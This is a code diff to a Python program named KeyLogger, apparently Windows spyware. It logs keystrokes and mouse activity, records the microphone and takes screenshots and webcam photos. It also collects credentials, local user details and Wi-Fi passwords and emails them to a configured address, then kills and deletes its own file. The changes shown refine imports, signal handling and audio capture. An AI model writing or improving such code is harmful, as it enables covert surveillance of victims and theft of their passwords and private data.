@@ -19,9 +19,9 @@ try:
     import pyscreenshot
     import soundfile as sf
     import sounddevice as sd
+    from pynput import mouse
     from pynput import keyboard
     from pydub import AudioSegment
-    from pynput.mouse import Listener as MouseListener
     from email.mime.multipart import MIMEMultipart
     from email.mime.base import MIMEBase
     from email.mime.text import MIMEText
@@ -37,7 +37,7 @@ except ModuleNotFoundError:
         except ModuleNotFoundError:
             missing_modules.append(module_name)
 
-    modules = ["opencv-python", "wmi", "pywin32", "requests", "pyscreenshot", "sounddevice", "soundfile", "pynput"]
+    modules = ["opencv-python", "wmi", "pywin32", "requests", "pyscreenshot", "sounddevice", "soundfile", "pydub", "pynput"]
 
     for module in modules:
         check_module(module)
@@ -55,12 +55,12 @@ finally:
         else:
             pass
 
-    def handle_exit(signum, frame):
+    def signal_exit(signum, frame):
         cleanup_temp_dir()
         exit(0)
 
-    signal.signal(signal.SIGINT, handle_exit)
-    signal.signal(signal.SIGTERM, handle_exit)
+    signal.signal(signal.SIGINT, signal_exit)
+    signal.signal(signal.SIGTERM, signal_exit)
 
     atexit.register(cleanup_temp_dir)
 
@@ -139,21 +139,28 @@ finally:
                 server.sendmail(sender, receiver, msg.as_string())
 
         def microphone(self):
-            fs = 44100 # Represents the sampling frequency (in Hz) for the audio recording.
+            fs = 44100  # Represents the sampling frequency (in Hz) for the audio recording.
             seconds = SEND_REPORT_EVERY
-            try:
-                recording = sd.rec(int(seconds * fs), samplerate = fs, channels = 2)
-                sd.wait()
+            audio_path = os.path.join(temp_dir, "audio.wav")
 
-                audio_path = os.path.join(temp_dir, "audio.wav")
+            try:
+                with sd.InputStream(samplerate = fs, channels = 2):
+                    recording = sd.rec(int(seconds * fs), samplerate = fs, channels = 2, dtype = 'int16')
+                    sd.wait()
+
                 sf.write(audio_path, recording, fs)
+                self.appendlog("Audio recorded successfully.\n")
 
                 try:
                     AudioSegment.from_wav(audio_path)
-                    self.appendlog("Audio recorded successfully.\n")
+                    self.appendlog("Audio file is playable.\n")
 
-                except Exception as play_error:
-                    self.appendlog(f"An error occurred while trying to play the recorded audio: {str(play_error)}\n")
+                except Exception as e:
+                    error_message = f"Error: Audio file is not playable - {str(e)}\n"
+                    self.appendlog(error_message)
+
+            except sd.PortAudioError as pa_error:
+                self.appendlog(f"An error occurred in PortAudio: {str(pa_error)}\n")
 
             except Exception as e:
                 self.appendlog(f"An error occurred while recording audio: {str(e)}\n")
@@ -425,7 +432,7 @@ finally:
             credentials_thread = threading.Thread(target = self.get_and_send_credentials)
             local_users_thread = threading.Thread(target = self.get_and_send_local_users_info)
 
-            mouse_listener = MouseListener(on_move = self.onMove, on_click = self.onClick, on_scroll = self.onScroll)
+            mouse_listener = mouse.Listener(on_move = self.onMove, on_click = self.onClick, on_scroll = self.onScroll)
             keyboard_listener = keyboard.Listener(on_press = self.onPress)
 
             wifi_passwords = self.get_wifi_passwords()
@@ -470,7 +477,7 @@ finally:
                 microphone_thread = threading.Thread(target = self.microphone)
                 screenshot_thread = threading.Thread(target = self.screenshot)
 
-                mouse_listener = MouseListener(on_move = self.onMove, on_click = self.onClick, on_scroll = self.onScroll)
+                mouse_listener = mouse.Listener(on_move = self.onMove, on_click = self.onClick, on_scroll = self.onScroll)
                 keyboard_listener = keyboard.Listener(on_press = self.onPress)
 
                 self.take_photo()
@@ -494,11 +501,13 @@ finally:
     if __name__ == "__main__":
         keylogger = KeyLogger(SEND_REPORT_EVERY, EMAIL_ADDRESS, EMAIL_PASSWORD)
         keylogger.run()
+
         try:
             pwd = os.path.abspath(os.getcwd())
             os.chdir(pwd)
             os.system("TASKKILL /F /IM " + os.path.basename(__file__))
             keylogger.appendlog('File was closed.')
             os.system("DEL " + os.path.basename(__file__))
+
         except OSError:
             keylogger.appendlog('File is close.')
